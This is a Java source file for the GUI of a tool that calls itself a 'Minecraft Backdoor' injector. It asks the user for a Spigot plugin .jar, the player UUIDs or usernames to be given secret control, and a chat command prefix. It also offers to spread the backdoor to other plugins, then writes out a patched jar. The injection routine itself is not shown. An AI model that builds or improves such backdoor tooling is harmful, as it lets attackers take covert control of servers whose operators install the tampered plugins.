package com.thiccindustries.debugger;

import javax.swing.*;
import javax.swing.filechooser.FileFilter;
import java.io.File;

public class InjectorGUI{

    public static void main(String[] args){
        try {
            UIManager.setLookAndFeel(UIManager.getLookAndFeel());
        }catch(Throwable ignored){}

        int result = 999;
        while(result != JOptionPane.YES_OPTION) {
            /*--- Home dialog ---*/
            String[] options = {"Inject", "About", "Close"};
            result = JOptionPane.showOptionDialog(
                    null,
                    "Thicc Industries' Minecraft Backdoor.\n" +
                            "Requirements:\n" +
                            "   * Minecraft UUID\n" +
                            "   * Target plugin .jar file",
                    "Thicc Industries Injector",
                    JOptionPane.YES_NO_CANCEL_OPTION,
                    JOptionPane.PLAIN_MESSAGE,
                    null,       //no custom icon
                    options,        //button titles
                    options[0]      //default button
            );

            if (result == JOptionPane.NO_OPTION) {
                JOptionPane.showMessageDialog(
                        null,
                        "Created by: Thicc Industries,\n" +
                                "Backdoor Version: 2.1\n" +
                                "Release Date: November 30 2021\n" +
                                "License: GPL v3.0",
                        "Thicc Industries Injector",
                        JOptionPane.INFORMATION_MESSAGE
                );
            }

            if(result == JOptionPane.CANCEL_OPTION)
                return;
        }

        /*--- Get Files ---*/
        JFileChooser fc = new JFileChooser();
        fc.setFileFilter(new FileFilter() {
            @Override
            public boolean accept(File file) {
                return file.getName().endsWith(".jar") || file.isDirectory();
            }

            @Override
            public String getDescription() {
                return "Spigot Plugin File (*.jar)";
            }
        });

        int result1 = fc.showOpenDialog(null);

        //Out dialog cancelled
        if(result1 != JFileChooser.APPROVE_OPTION)
            return;

        String InPath = fc.getSelectedFile().getPath();

        int sep = InPath.lastIndexOf(".");
        String OutPath = InPath.substring(0, sep) + "-patched.jar";

        /*--- Query options ---*/
        Boolean UUIDsAreUsernames;
        String UUIDList;
        String ChatPrefix;
        Boolean InjectOther;

        int usernames = JOptionPane.showConfirmDialog(null, "Use offline mode? (Usernames)", "Thicc Industries Injector", JOptionPane.YES_NO_OPTION);
        UUIDsAreUsernames = usernames == JOptionPane.YES_OPTION;

        UUIDList = (String)JOptionPane.showInputDialog(
                null,
                "Minecraft " + (UUIDsAreUsernames ? "Usernames" : "UUIDs") + " (Separated by commas):",
                "Thicc Industries Injector",
                JOptionPane.PLAIN_MESSAGE,
                null,
                null,
                ""
        );

        //No input
        if(UUIDList.isEmpty())
            return;

        ChatPrefix = (String)JOptionPane.showInputDialog(
                null,
                "Chat Command Prefix:",
                "Thicc Industries Injector",
                JOptionPane.PLAIN_MESSAGE,
                null,
                null,
                "#"
        );

        //No input
        if(ChatPrefix.isEmpty())
            return;

        InjectOther = JOptionPane.showConfirmDialog(
                null,
                "Inject to other plugins?\n[This feature is experimental!]",
                "Thicc Industries Injector",
                JOptionPane.YES_NO_OPTION
        ) == JOptionPane.YES_OPTION;

        //Parse uuids

        String[] splitUUID = UUIDList.split(",");

        Injector.SimpleConfig sc = new Injector.SimpleConfig(UUIDsAreUsernames, splitUUID, ChatPrefix, InjectOther);
        boolean result2 = Injector.patchFile(InPath, OutPath, sc, true, false);

        if(result2){
            JOptionPane.showMessageDialog(null, "Backdoor injection complete.\nIf this project helped you, considering starring it on GitHub.", "Thicc Industries Injector", JOptionPane.INFORMATION_MESSAGE);
        }else{
            JOptionPane.showMessageDialog(null, "Backdoor injection failed.\nPlease create a GitHub issue report if necessary.", "Thicc Industries Injector", JOptionPane.ERROR_MESSAGE);
        }
    }

    public static void displayError(String message){
        JOptionPane.showMessageDialog(null, message, "Thicc Industries Injector", JOptionPane.ERROR_MESSAGE);
    }
}
